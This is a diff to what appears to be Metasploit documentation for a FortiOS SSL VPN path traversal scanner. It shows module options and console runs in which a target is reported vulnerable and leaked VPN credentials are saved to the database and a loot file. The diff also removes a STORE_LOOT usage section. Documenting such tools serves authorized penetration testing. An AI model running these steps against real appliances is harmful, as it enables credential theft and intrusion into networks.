@@ -26,10 +26,6 @@ Dump format. (Accepted: raw, ascii)
 
 Store credential into the Metasploit database.
 
-### STORE_LOOT
-
-Store dump in loot directory.
-
 ## Scenarios
 
 ### Usages
@@ -49,15 +45,16 @@ Module options (auxiliary/scanner/http/fortios_vpnssl_traversal_leak):
    RPORT        10443            yes       The target port (TCP)
    SSL          true             no        Negotiate SSL/TLS for outgoing connections
    STORE_CRED   true             no        Store credential into the database.
-   STORE_LOOT   false            no        Store dump in loot.
    TARGETURI    /remote          yes       Base path
    THREADS      16               yes       The number of concurrent threads (max one per host)
    VHOST                         no        HTTP server virtual host
 
 msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > run
 
-[*] Trying - https://XXX.XX.XXX.X:10443/
-[+] Target - https://XXX.XX.XXX.X:10443/ - Vulnerable!
+[*] https://XXX.XX.XXX.X:10443 - Trying to connect.
+[+] https://XXX.XX.XXX.X:10443 - Vulnerable!
+[+] https://XXX.XX.XXX.X:10443 - File saved to /home/mekhalleh/.msf4/loot/20201216194020_default_XXX.XX.XXX.X__667507.txt
+[+] https://XXX.XX.XXX.X:10443 - 1 credential(s) found!
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > creds
@@ -68,24 +65,5 @@ host          origin        service            public  private  realm  private_t
 ----          ------        -------            ------  -------  -----  ------------  ----------
 XXX.XX.XXX.X  XXX.XX.XXX.X  10443/tcp (https)  redacted  redacted          Password      
 
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) >
-```
-
-You can get a dump capture of the leaked data file.
-
-To do this specific thing, here's how you do it:
-
-```
-msf6 > use auxiliary/scanner/http/fortios_vpnssl_traversal_leak
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > set RHOSTS [IP]
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > set LHOST 10443
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > set STORE_LOOT true
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > run
-
-[*] Trying - https://XXX.XX.XXX.X:10443/
-[+] Target - https://XXX.XX.XXX.X:10443/ - Vulnerable!
-[+] File saved to /home/mekhalleh/.msf4/loot/20201130122633_default_XXX.XX.XXX.X__209748.txt
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
 msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) >
 ```
